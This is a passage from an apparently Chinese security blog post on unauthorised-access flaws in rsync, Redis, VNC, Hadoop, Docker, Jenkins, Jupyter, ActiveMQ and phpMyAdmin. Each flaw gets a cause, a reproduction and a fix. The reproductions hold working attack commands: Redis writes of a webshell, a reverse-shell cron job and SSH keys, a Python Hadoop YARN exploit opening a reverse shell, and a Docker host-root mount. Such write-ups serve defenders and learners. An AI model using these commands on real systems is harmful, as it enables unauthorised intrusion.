<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/25.png" alt=""></p>
<p>写入反弹shell的bash文件</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/26.png" alt=""></p>
<p>使用rsync上传至/etc/cron.hourly</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsync -av nc rsync:/your-ip:873/src/etc/cron.hourly</span><br></pre></td></tr></table></figure>

<p>已成功上传至容器内的<code>/etc/cron.hourly</code>目录</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/27.png" alt=""></p>
<p>攻击机监听端口，成功获取shell</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/24.png" alt=""></p>
<h5 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>修改配置文件<code>/etc/rsyncd.conf</code>参数</p>
<ol>
<li><p>访问控制</p>
<p>设置<code>host allow = 127.0.0.1</code></p>
</li>
<li><p>权限控制</p>
<p>设置<code>read only = yes</code></p>
</li>
<li><p>访问认证</p>
<p>设置<code>auth users</code>认证用户名、<code>secrets files</code>密码文件(username:password)</p>
<p><code>auth users = username</code></p>
<p><code>secrets files = /etc/rsyncd.passwd</code></p>
</li>
<li><p>模块隐藏</p>
<p>设置<code>list = false</code></p>
</li>
</ol>
<h2 id="Redis未授权访问漏洞"><a href="#Redis未授权访问漏洞" class="headerlink" title="Redis未授权访问漏洞"></a>Redis未授权访问漏洞</h2><h5 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。利用Redis自身提供的config命令，可以进行写文件操作，可以写入ssh公钥、webshell、定时任务等操作</p>
<h5 id="漏洞复现-6"><a href="#漏洞复现-6" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p><strong>nmap扫描redis服务</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 6379 --script redis-info ip</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/30.png" alt=""></p>
<p><strong>未授权访问测试</strong></p>
<ol>
<li><p>使用redisclient.jar直接无账号登录redis</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/31.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/32.png" alt=""></p>
</li>
<li><p>redis-cli</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/33.png" alt=""></p>
</li>
</ol>
<p><strong>利用漏洞写入webshell</strong></p>
<blockquote>
<p>利用条件：</p>
<ol>
<li><p>存在web服务</p>
<ol start="2">
<li>知道网站绝对路径</li>
<li>具有读写权限</li>
</ol>
</li>
</ol>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/www/html</span><br><span class="line">config <span class="built_in">set</span> dbfilename shell.php</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n"</span></span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>\r\n\r\n代表换行，用redis写入的文件会自带一些版本信息，如果不换行可能会导致无法执行。</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/34.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/35.png" alt=""></p>
<p><strong>利用漏洞写入定时任务反弹shell</strong></p>
<blockquote>
<p>利用条件：</p>
<ol>
<li><p>具有可写计划任务权限</p>
<ol start="2">
<li>centos：由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败</li>
</ol>
</li>
</ol>
</blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">config <span class="built_in">set</span> dir /var/spool/cron</span><br><span class="line"><span class="built_in">set</span> x <span class="string">"\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.120.60/9999 0&gt;&amp;1\n\n"</span></span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>计划任务：每分钟执行一次反弹shell的命令</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/36.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/37.png" alt=""></p>
<p><strong>利用漏洞写入ssh公钥</strong></p>
<blockquote>
<p>利用条件：</p>
<ol>
<li><p>root权限</p>
<ol start="2">
<li>开启ssh密钥登录</li>
</ol>
</li>
</ol>
</blockquote>
<p>当redis服务以root身份运行，可以给root账户写入SSH公钥文件，直接通过SSH连接目标服务器</p>
<ul>
<li>ssh-keygen生成公钥</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/38.png" alt=""></p>
<ul>
<li>将公钥导入key.txt文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">echo</span> -e <span class="string">"\n\n"</span>; cat /root/.ssh/id_rsa.pub; <span class="built_in">echo</span> -e <span class="string">"\n\n"</span>) &gt; key.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>将公钥设置为redis的变量</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /opt/key.txt | redis-cli -h 192.168.120.67 -x <span class="built_in">set</span> myssh</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/39.png" alt=""></p>
<ul>
<li>在目标机<code>/root/.ssh</code>目录下生成authorized_keys文件</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 192.168.168.133</span><br><span class="line">config <span class="built_in">set</span> dir /root/.ssh</span><br><span class="line">config <span class="built_in">set</span> dbfilename authorized_keys</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/40.png" alt=""></p>
<p>成功写入authorized_keys文件</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/41.png" alt=""></p>
<p>本地ssh成功连接</p>
<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh <span class="number">192.168</span><span class="number">.120</span><span class="number">.67</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/42.png" alt=""></p>
<p><strong>利用漏洞主从复制RCE</strong></p>
<p>如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，<strong>主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机</strong>，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
<blockquote>
<p>利用条件：</p>
<ol>
<li><p>存在未授权访问漏洞</p>
<ol start="2">
<li>redis version &gt;= 4.0</li>
</ol>
</li>
</ol>
</blockquote>
<p>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在Redis中实现一个新的Redis命令，通过写C语言编译并加载恶意的.so文件，达到代码执行的目的。</p>
<p>container1:27001-&gt;6379</p>
<p>container2:27002-&gt;6379</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/47.png" alt=""></p>
<ol>
<li>make生成恶意.so文件</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>攻击机执行脚本，可选择生成一个交互的shell，或者重新反弹一个shell</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;Ridter&#x2F;redis-rce.git</span><br><span class="line">python redis-rce.py -r 192.168.1.54 -p 27001 -L 192.168.1.55 -f module.so</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/48.png" alt=""></p>
<h5 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>启动密码认证redis</li>
<li>添加ip访问限制</li>
<li>更改默认端口6379</li>
<li>低权限启动redis服务</li>
</ol>
<h2 id="VNC未授权访问漏洞"><a href="#VNC未授权访问漏洞" class="headerlink" title="VNC未授权访问漏洞"></a>VNC未授权访问漏洞</h2><h5 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>VNC 是虚拟网络控制台,一款优秀的远程控制工具软件，默认端口号为 5900、5901，未授权访问产生原因是未设置VNC连接密码。VNC 未授权访问漏洞被利用可能造成恶意用户直接控制受控主机，危害相当严重</p>
<h5 id="漏洞复现-7"><a href="#漏洞复现-7" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>安装vnc客户端，选择无验证</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/28.png" alt=""></p>
<p>kali上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vncviewer 192.168.120.71</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/29.png" alt=""></p>
<h5 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>配置 VNC 客户端登录口令认证并配置强口令</li>
<li>以最小普通权限身份运行操作系统</li>
</ol>
<h2 id="Hadoop未授权访问漏洞"><a href="#Hadoop未授权访问漏洞" class="headerlink" title="Hadoop未授权访问漏洞"></a>Hadoop未授权访问漏洞</h2><h5 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Hadoop 默认开放了很多端口来提供 WebUI 服务，通过访问HDFS的WebUI 管理界面的 50070 端口，可以命令行操作多个目录下的数据，如进行删除，下载，目录浏览甚至命令执行等操作</p>
<h5 id="漏洞复现-8"><a href="#漏洞复现-8" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><blockquote>
<p>利用过程：</p>
<pre><code>1. 本地监听端口

2. 调用New Application API创建Application
            3. 调用Submit Application API提交</code></pre></blockquote>
<p><strong>未授权访问测试</strong></p>
<p>访问<code>http://your-ip:8088/cluster</code></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/43.png" alt=""></p>
<ul>
<li>EXP</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#usage:	python hadoopEXP.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">target = <span class="string">'http://target-hadoop-ip:8088/'</span></span><br><span class="line">lhost = <span class="string">'your-ip'</span></span><br><span class="line"></span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps/new-application'</span></span><br><span class="line">resp = requests.post(url)</span><br><span class="line">app_id = resp.json()[<span class="string">'application-id'</span>]</span><br><span class="line">url = target + <span class="string">'ws/v1/cluster/apps'</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">'application-id'</span>: app_id,</span><br><span class="line">    <span class="string">'application-name'</span>: <span class="string">'get-shell'</span>,</span><br><span class="line">    <span class="string">'am-container-spec'</span>: &#123;</span><br><span class="line">        <span class="string">'commands'</span>: &#123;</span><br><span class="line">            <span class="string">'command'</span>: <span class="string">'/bin/bash -i &gt;&amp; /dev/tcp/%s/8080 0&gt;&amp;1'</span> % lhost,</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'application-type'</span>: <span class="string">'YARN'</span>,</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, json=data)</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/44.png" alt=""></p>
<h5 id="漏洞修复-8"><a href="#漏洞修复-8" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>关闭Hadoop Web管理页面</li>
<li>开启身份验证，防止未经授权用户访问</li>
<li>设置安全组访问控制策略，只有信任IP能访问开放的端口</li>
</ol>
<h2 id="Docker未授权访问漏洞"><a href="#Docker未授权访问漏洞" class="headerlink" title="Docker未授权访问漏洞"></a>Docker未授权访问漏洞</h2><h5 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Docker Remote API是一个取代远程命令行界面（rcli）的REST API。存在问题的版本分别为1.3和1.6，因为权限控制等问题导致可以通过docker client或者http直接请求就可以访问这个API，通过这个接口，我们可以新建 container，删除已有container，获取宿主机的 shell。</p>
<h5 id="漏洞复现-9"><a href="#漏洞复现-9" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>通过命令连接，返回信息说明漏洞存在</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://172.16.41.176:2375 version</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/55.png" alt=""></p>
<p><strong>写入ssh公钥</strong></p>
<p>运行一个新容器，并且将该宿主机的根目录挂在到容器的/mnt目录下，启动之后就会获得该容器宿主机的shell</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker -H tcp://172.16.41.176:2375 run -it -v /:/mnt nginx:latest /bin/bash</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/56.png" alt=""></p>
<p>将攻击者的ssh公钥<code>~/.ssh/id_rsa.pub</code>的内容写到入宿主机的<code>/root/.ssh/authorized_keys</code>文件中，之后就可以用root账户直接登录，过程不再赘述</p>
<h5 id="漏洞修复-9"><a href="#漏洞修复-9" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>设置ACL，对2375端口做网络访问控制，只允许信任ip连接对应端口</li>
<li>修改docker swarm的认证方式，使用TLS认证：Overview Swarm with TLS 和 Configure Docker  Swarm for TLS这两篇文档，说的是配置好TLS后，Docker CLI 在发送命令到docker  daemon之前，会首先发送它的证书，如果证书是由daemon信任的CA所签名的，才可以继续执行</li>
</ol>
<h2 id="Jenkins未授权访问漏洞"><a href="#Jenkins未授权访问漏洞" class="headerlink" title="Jenkins未授权访问漏洞"></a>Jenkins未授权访问漏洞</h2><h5 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>未授权访问管理控制台,可以通过脚本命令行执行系统命令。通过该漏洞,可以后台管理服务,通过脚本命令行功能执行系统命令,如反弹shell,wget写webshell文件</p>
<h5 id="漏洞复现-10"><a href="#漏洞复现-10" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问<code>http://192.168.88.102:8080/manage</code>写shell</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/49.png" alt=""></p>
<p>执行系统命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">println <span class="string">"whoami"</span>.execute().text</span><br></pre></td></tr></table></figure>

<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/50.png" alt=""></p>
<p>还可以进行写webshell，写crontab反弹shell等操作，前提具有一定高权限</p>
<h5 id="漏洞修复-10"><a href="#漏洞修复-10" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>添加登录密码验证</li>
<li>升级版本</li>
</ol>
<h2 id="Jupyter-Notebook未授权访问漏洞"><a href="#Jupyter-Notebook未授权访问漏洞" class="headerlink" title="Jupyter Notebook未授权访问漏洞"></a>Jupyter Notebook未授权访问漏洞</h2><h5 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>Jupyter Notebook（此前被称为 IPython notebook）是一个交互式笔记本，支持运行 40 多种编程语言，默认监听在8888端口。如果管理员未为Jupyter Notebook配置密码，将导致未授权访问漏洞，游客可在其中创建一个console并执行任意Python代码和命令</p>
<h5 id="漏洞复现-11"><a href="#漏洞复现-11" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>访问<code>http://your-ip:8888</code></p>
<p>可以直接打开一个终端</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/45.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/46.png" alt=""></p>
<h5 id="漏洞修复-11"><a href="#漏洞修复-11" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>开启身份验证，配置密码</li>
<li>设置访问控制策略</li>
</ol>
<h2 id="ActiveMQ未授权访问漏洞"><a href="#ActiveMQ未授权访问漏洞" class="headerlink" title="ActiveMQ未授权访问漏洞"></a>ActiveMQ未授权访问漏洞</h2><h5 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>ActiveMQ是一种在分布式系统中应用程序借以传递消息的媒介，默认监听在8161端口。默认情况下，ActiveMQ服务是没有配置安全参数，攻击者可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。ActiveMQ默认账号密码为<code>admin/admin</code></p>
<h5 id="漏洞复现-12"><a href="#漏洞复现-12" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>利用未授权漏洞，结合默认PUT请求方法任意文件上传</p>
<p>访问<code>http://your-ip:8161/</code>登录</p>
<p>ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息。若服务器存在fileserver目录，则可以通过put请求写入文件，但fileserver下的文件默认不解析。</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/51.png" alt=""></p>
<p>然后使用MOVE请求移动文件，如果是写入webshell需要做的物理路径，在<code>http://your-ip:8161/admin/test/systemProperties.jsp</code>可以查看物理路径</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/53.png" alt=""></p>
<p>MOVE移动文件</p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/52.png" alt=""></p>
<p><img src="https://tattooweb_admin.gitee.io/pic/%E5%B8%B8%E8%A7%81%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/54.png" alt=""></p>
<h5 id="漏洞修复-12"><a href="#漏洞修复-12" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>针对未授权访问，可修改conf/jetty.xml文件，bean id为securityConstraint下的authenticate修改值为true，重启服务</li>
<li>针对弱口令，可修改conf/jetty.xml文件，bean id 为securityLoginService下的conf值获取用户properties，修改用户名密码，重启服务</li>
</ol>
<h2 id="宝塔面板phpMyAdmin未授权访问漏洞"><a href="#宝塔面板phpMyAdmin未授权访问漏洞" class="headerlink" title="宝塔面板phpMyAdmin未授权访问漏洞"></a>宝塔面板phpMyAdmin未授权访问漏洞</h2><h5 id="漏洞成因-13"><a href="#漏洞成因-13" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><p>漏洞未phpmyadmin未鉴权，可通过特定地址直接登录数据库的漏洞。</p>
<p>宝塔Linux面板7.4.2版本和Windows面板6.8版本存在phpmyadmin未授权访问漏洞</p>
<h5 id="漏洞复现-13"><a href="#漏洞复现-13" class="headerlink" title="漏洞复现"></a>漏洞复现</h5><p>直接访问<code>http://ip:888/pma</code>即可直接登录</p>
<h5 id="漏洞修复-13"><a href="#漏洞修复-13" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><ol>
<li>更新版本</li>
<li>进入<code>/www/server/phpmyadmin/</code>目录，把<code>PMA</code>目录删掉</li>
</ol>


        <hr>
        <!-- Pager -->
        <ul class="pager">
          
          <li class="previous">
            <a href="/2021/01/15/MySQL8-0注入新特性/" data-toggle="tooltip" data-placement="top" title="MySQL8.0注入新特性">&larr; Previous Post</a>
          </li>
          
          
          <li class="next">
            <a href="/2020/11/26/初探邮件钓鱼/" data-toggle="tooltip" data-placement="top" title="初探邮件钓鱼">Next Post &rarr;</a>
          </li>
          
        </ul>

        
        <!-- tip start -->
        <div class="tip">
          <p>
            If you like this blog or find it useful for you, you are welcome to comment on it. You are also welcome to share this blog, so that more people can participate in it. If the images used in the blog infringe your copyright, please contact the author to delete them. Thank you !
          </p>
        </div>
        <!-- tip end -->
        

        
        <!-- Sharing Srtart -->
        <!-- Social Social Share Post -->
<!-- Docs:https://github.com/overtrue/share.js -->

<div class="social-share" data-initialized="true" data-disabled="tencent ,douban ,qzone ,linkedin ,facebook ,google ,diandian" data-wechat-qrcode-helper="" align="center">
  <ul class="list-inline text-center social-share-ul">
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-twitter">
        <i class="fa fa-twitter fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a class="social-share-icon icon-wechat">
        <i class="fa fa-weixin fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-weibo">
        <i class="fa fa-weibo fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon icon-qq">
        <i class="fa fa-qq fa-1x" aria-hidden="true"></i>
      </a>
    </li>
    <li class="social-share-li">
      <a target="_blank" class="social-share-icon" href="mailto:?subject=常见未授权访问漏洞&body=Hi,I found this website and thought you might like it https://www.tattooo.top/2020/12/11/常见未授权访问漏洞/">
        <i class="fa fa-envelope fa-1x" aria-hidden="true"></i>
      </a>
    </li>
  </ul>
</div>

<!-- css & js -->
<!-- <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css"> -->
<script defer="defer" async="true" src="https://cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/js/social-share.min.js"></script>

        <!-- Sharing End -->
        
        <hr>

        <!-- comments start -->
        <!-- 1. gitalk comment -->



<!-- 2. gitment comment -->



<!-- 3. disqus comment -->


        <!-- comments end -->
        <hr>

      </div>

      <!-- Catalog: Tabe of Content -->
      <!-- Table of Contents -->

    
      <aside id="sidebar">
        <div id="toc" class="toc-article">
        <strong class="toc-title">Contents</strong>
        
          <ol class="toc-nav"><li class="toc-nav-item toc-nav-level-1"><a class="toc-nav-link" href="#未授权访问漏洞"><span class="toc-nav-number">1.</span> <span class="toc-nav-text">未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-2"><a class="toc-nav-link" href="#MongoDB未授权访问漏洞"><span class="toc-nav-number">1.1.</span> <span class="toc-nav-text">MongoDB未授权访问漏洞</span></a><ol class="toc-nav-child"><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞成因"><span class="toc-nav-number">1.1.0.0.1.</span> <span class="toc-nav-text">漏洞成因</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞复现"><span class="toc-nav-number">1.1.0.0.2.</span> <span class="toc-nav-text">漏洞复现</span></a></li><li class="toc-nav-item toc-nav-level-5"><a class="toc-nav-link" href="#漏洞修复"><span class="toc-nav-number">1.1.0.0.3.</span> <span class="toc-nav-text">漏洞修复</span></a></li></ol></li></ol></li></ol></li><li class="toc-nav-item 